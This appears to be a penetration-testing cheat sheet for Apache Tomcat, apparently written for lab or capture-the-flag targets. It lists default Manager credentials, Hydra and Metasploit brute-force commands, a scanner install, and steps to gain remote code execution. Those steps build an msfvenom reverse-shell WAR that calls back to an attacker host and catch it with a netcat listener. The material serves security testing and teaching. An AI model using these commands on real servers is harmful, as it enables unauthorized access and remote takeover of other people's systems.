# Default Credentials

- `admin:admin`
- `tomcat:tomcat`
- `admin:` *(empty password)*
- `admin:s3cr3t`
- `tomcat:s3cr3t`
- `tomcat:s3cret`
- `admin:tomcat`

# Brute-Force Techniques

## Using Metasploit
Metasploit has an auxiliary module to brute-force login for Tomcat Manager:

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
```

## Using Hydra
Hydra is a powerful tool for brute-forcing authentication credentials. The following command is an example of brute-forcing the Tomcat Manager login page:

```bash
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```
- **-L** specifies the file containing a list of usernames.
- **-P** specifies the file containing a list of passwords.
- **-f** stops the attack when the first valid credential is found.

# Scanning

## Apache Tomcat Scanner

The Apache Tomcat Scanner is a Python tool that can be used to scan for and identify vulnerable Apache Tomcat servers.

**Installation:**
```bash
sudo python3 -m pip install apachetomcatscanner
```

**Usage:**
```bash
apachetomcatscanner -tt 192.168.12.2 -tp 8080
```
- **-tt** specifies the target IP.
- **-tp** specifies the target port.

## Passwords Backtrace Disclosure
Sometimes sensitive information such as credentials might be disclosed in error pages or specific files:

- `/auth.jsp` might disclose passwords or other sensitive information.

---

# Account Exploitation

## Manager - Remote Code Execution (RCE)
To exploit Tomcat Manager for RCE, you need to deploy a WAR file with sufficient privileges (roles: `admin`, `manager`, or `manager-script`). These roles are often defined in `tomcat-users.xml`, typically found at `/usr/share/tomcat9/etc/tomcat-users.xml` (this path may vary based on the Tomcat version).

### Proof of Concept (PoC)

1. **Using Metasploit:**
    ```bash
    use exploit/multi/http/tomcat_mgr_upload
    msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
    msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
    msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
    msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
    msf exploit(multi/http/tomcat_mgr_upload) > exploit
    ```

2. **Manually Using `msfvenom`:**
   Generate a WAR payload with `msfvenom`:
   ```bash
   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=8083 -f war -o revshell.war
   ```
   - **-p** specifies the payload type.
   - **LHOST** specifies the local host for the reverse shell.
   - **LPORT** specifies the local port for the reverse shell.
   - **-f war** outputs the payload in WAR format.
   - **-o** specifies the output file.

   Upload the generated WAR file to Tomcat Manager and access it via `/revshell/`.

3. **Start a Listener:**
   Set up a listener on your machine to catch the reverse shell:
```bash
   nc -lvnp 8083
```
   - **-l** sets Netcat to listen mode.
   - **-v** enables verbose output.
   - **-n** prevents DNS resolution.
   - **-p** specifies the port to listen on.